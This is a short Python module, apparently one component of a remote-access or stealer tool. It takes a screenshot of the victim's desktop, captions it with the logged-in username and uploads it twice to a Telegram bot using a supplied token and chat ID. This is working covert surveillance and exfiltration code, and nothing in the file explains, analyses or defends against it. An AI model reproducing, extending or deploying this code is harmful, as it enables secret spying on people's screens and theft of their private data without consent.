import tempfile
import pyautogui
import requests
import getpass
class Screenshot():
	def __init__(self, _):
		self.token = _.token
		self.chat_id = _.chat_id
		self.Main()

	def Main(self):
		file = tempfile.TemporaryFile()
		filename = file.name + ".jpg"
		file.close()
		pyautogui.screenshot().save(filename)
		requests.get("https://api.telegram.org/bot" + self.token + "/sendPhoto?caption=--" + getpass.getuser() + "--&chat_id=" + self.chat_id, files={'photo':open(filename,'rb')})
		requests.get('https://api.telegram.org/bot' + self.token + '/sendDocument?chat_id=' + self.chat_id, files = {'document' : open(filename,'rb')})
